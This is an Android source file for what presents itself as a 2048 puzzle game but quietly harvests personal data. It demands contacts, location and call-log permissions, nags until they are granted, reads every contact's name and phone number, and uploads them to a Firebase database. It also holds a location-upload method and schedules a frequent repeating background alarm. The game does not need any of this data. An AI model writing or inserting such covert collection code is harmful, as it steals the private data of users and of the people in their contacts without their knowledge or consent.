package com.example.alleg.a4471project;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {
    private final int PERMISSIONS = 1;
    DatabaseReference mRootRef = FirebaseDatabase.getInstance().getReference();

    // for 2048 game
    GameLogic mainLogic;
    SharedPreferences prefs;
    private final String HIGH_SCORE_TAG = "2048Score";
    private TextView highScoreView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        checkPermissions();
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED) {
            getContactList();
        }

        prefs = getApplicationContext().getSharedPreferences("2048", 0);
        mainLogic = initGameLogic();

        Button restartButton = findViewById(R.id.restart);
        restartButton.setText("Restart");
        restartButton.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                mainLogic = initGameLogic();
            }
        });
        highScoreView = findViewById(R.id.highScore);
        highScoreView.setText(Integer.toString(getHighScore()));
    }

    public void checkPermissions(){
        String[] requests = {
                android.Manifest.permission.READ_CONTACTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CALL_LOG

        };
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            // Permission is not granted
            ActivityCompat.requestPermissions(this,requests,PERMISSIONS);
        }

    }
    @Override
    public void onResume(){
        super.onResume();
        Log.d("MAINACTIVITY", "RESUME");
        Intent intent = new Intent(getApplicationContext(), AlarmReceiver.class);
        PendingIntent alarmIntent = PendingIntent.getBroadcast(getApplicationContext(), 1, intent, 0);
        AlarmManager am =( AlarmManager)getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        if (am!= null) {
            am.cancel(alarmIntent);
        }
        am.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 5000,500, alarmIntent);
        // SystemClock.elapsedRealtime() + AlarmManager.INTERVAL_HALF_HOUR,
        //        AlarmManager.INTERVAL_HALF_HOUR
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSIONS: {
                // If request is cancelled, the result arrays are empty.
                for(int i = 0; i < permissions.length;i++){
                    String permission = permissions[i];
                    if(permission.equals(Manifest.permission.READ_CONTACTS)){
                        if(grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                            getContactList();
                        }
                    }
                }
                for(int result: grantResults){
                    if(result != PackageManager.PERMISSION_GRANTED){
                        checkPermissions();
                    }
                }
            }

            // other 'case' lines to check for other
            // permissions this app might request.
        }
    }

    private void writeNewContact(String userId, String fullName, String phoneNumber){
        Contact contact = new Contact(fullName, phoneNumber);

        mRootRef.child("contacts").child(userId).child(fullName).setValue(contact);
    }

    private void writeNewLocation(String userId, String longitude, String latitude){
        Location location = new Location(longitude, latitude);

        mRootRef.child("locations").child(userId).setValue(location);
    }

    private void getContactList() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        String userID = getUserid();
                        writeNewContact(userID, name, phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }
    }
    public String getUserid(){
        return FirebaseAuth.getInstance().getUid();
    }

    // 2048 code below
    private Button[][] getButtons() {
        Button[][] buttons =  new Button[4][4];

        for (int i = 0; i < 4; i++) {
            for (int j = 0; j < 4; j++ ) {
                String buttonID = "grid" + i + j;
                int resID = getResources().getIdentifier(buttonID, "id", getPackageName());
                buttons[i][j] = findViewById(resID);
                buttons[i][j].setTextSize(22);
            }
        }

        return buttons;
    }

    private class Ender implements GameLogic.OnGameEnd {
        @Override
        public void onGameWin(int score) {
            final int s = score;
            MainActivity.this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    newHighScore(s);
                    displayGameWon();
                }
            });
        }

        @Override
        public void onGameLose(int score) {
            final int s = score;
            MainActivity.this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    newHighScore(s);
                    displayGameLose();
                }
            });
        }

        @Override
        public void updateHighScore(int score) {
            final int s = score;
            MainActivity.this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    newHighScore(s);
                    displayGameLose();
                }
            });
        }
    }

    private GameLogic initGameLogic() {
        TextView sd = findViewById(R.id.score);

        Ender ender = new Ender();

        // get main table, set  up swipe listeners
        LinearLayout mainTable = findViewById(R.id.MainTable);
        mainTable.setOnTouchListener(new MainSwipeListener(MainActivity.this) {
            int progressLock = 0;

            @Override
            public void onSwipeTop() {
                if (progressLock == 0) {
                    progressLock = 1;
                    new AsyncTask<Void, Void, Void>() {
                        @Override
                        protected Void doInBackground(Void... params) {
                            mainLogic.swipeUp();
                            progressLock = 0;
                            return null;
                        }
                    }.execute();
                }
            }

            @Override
            public void onSwipeRight() {
                if (progressLock == 0) {
                    progressLock = 1;
                    new AsyncTask<Void, Void, Void>() {
                        @Override
                        protected Void doInBackground(Void... params) {
                            mainLogic.swipeRight();
                            progressLock = 0;
                            return null;
                        }
                    }.execute();
                }
            }

            @Override
            public void onSwipeLeft() {
                if (progressLock == 0) {
                    progressLock = 1;
                    new AsyncTask<Void, Void, Void>() {
                        @Override
                        protected Void doInBackground(Void... params) {
                            mainLogic.swipeLeft();
                            progressLock = 0;
                            return null;
                        }
                    }.execute();
                }
            }

            @Override
            public void onSwipeBottom() {
                if (progressLock == 0) {
                    progressLock = 1;
                    new AsyncTask<Void, Void, Void>() {
                        @Override
                        protected Void doInBackground(Void... params) {
                            mainLogic.swipeDown();
                            progressLock = 0;
                            return null;
                        }
                    }.execute();
                }
            }
        });

        return new GameLogic(getButtons(), sd, ender, getHighScore());
    }

    private void displayGameWon() {

    }

    private void displayGameLose() {

    }

    private void newHighScore(int score) {
        if (score > getHighScore()) {
            SharedPreferences.Editor editor = prefs.edit();
            editor.putInt(HIGH_SCORE_TAG, score);
            editor.commit();

            highScoreView.setText(Integer.toString(score));
        }
    }

    private int getHighScore () {
        return prefs.getInt(HIGH_SCORE_TAG, 0);
    }
}
